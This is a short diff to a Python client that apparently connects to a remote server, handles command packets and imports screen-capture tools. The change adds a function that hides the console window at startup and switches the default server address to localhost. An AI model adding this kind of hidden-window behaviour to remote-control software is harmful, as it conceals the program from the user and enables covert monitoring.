@@ -8,13 +8,19 @@ import base64
 from PIL import ImageGrab
 from packet import Packet
 
+def hide():
+    import win32console,win32gui
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window,0)
+    return True
+
 def signal_handler(signal, frame):
         print('You pressed Ctrl+C!')
         sys.exit(0)
 
 class Client:
 
-    def __init__(self,ip='25.135.29.20',port=5715):
+    def __init__(self,ip='localhost',port=5715):
         self.messageQ = Queue()
 
         TCP_IP = ip
@@ -30,7 +36,6 @@ class Client:
         while True:
             pkt = Packet()
             pkt.construct(self.s)
-            print pkt
             if pkt.state:
                 if pkt.state == "100":
                     print "hello"
@@ -106,6 +111,7 @@ def main():
     c.run()
 
 if __name__ == '__main__':
+    hide()
     #signal handlers
     signal.signal(signal.SIGINT, signal_handler)
 
